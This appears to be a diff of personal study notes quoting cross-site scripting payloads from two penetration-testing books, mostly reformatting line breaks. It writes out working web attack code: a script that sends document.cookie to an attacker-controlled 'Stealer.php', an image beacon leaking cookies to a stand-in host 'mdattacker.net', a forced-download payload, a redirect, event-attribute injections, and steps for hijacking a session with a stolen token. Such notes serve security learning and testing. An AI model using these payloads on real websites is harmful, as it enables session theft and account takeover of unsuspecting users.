@@ -1,10 +1,16 @@
 
 Kim, Peter. The Hacker Playbook 3: Practical Guide To Penetration Testing (p. 54). Secure Planet. Kindle Edition.
 
-Cookie Stealing XSS: <script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script>
-Forcing the Download of a File: <script>var link = document.createElement('a'); link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = ''; document.body.appendChild(link); link.click();</script>
-Redirecting User: <script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
-Other Scripts to Enable Key Loggers, Take Pictures, and More  http://www.xss-payloads.com/payloads-list.html?c#category=capture
+Cookie Stealing XSS: 
+<script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script>
+Forcing the Download of a File: 
+<script>var link = document.createElement('a'); link.href = 
+       'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = '';
+        document.body.appendChild(link); link.click();</script>
+Redirecting User: 
+<script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
+Other Scripts to Enable Key Loggers, Take Pictures, and More  
+http://www.xss-payloads.com/payloads-list.html?c#category=capture
 
 Event Attributes that execute JavaScript being outside a <script> tag: 
   <b onmouseover=alert('XSS')>Click Me!</b>  
@@ -21,7 +27,9 @@ var i=new Image; i.src="http://mdattacker.net/"+document.cookie;
  The request contains the user's current session token for the application:
   GET /sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1
   Host: mdattacker.net
- 7. The attacker monitors requests to mdattacker.net and receives the user's request. He uses the captured token to hijack the user's session, gaining access to that user's personal information and performing arbitrary actions “as” the user.
+ 7. The attacker monitors requests to mdattacker.net and receives the user's request. 
+ He uses the captured token to hijack the user's session, gaining access to that user's personal information and 
+ performing arbitrary actions “as” the user.
 
 Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 11652-11656). Wiley. Kindle Edition. 
 
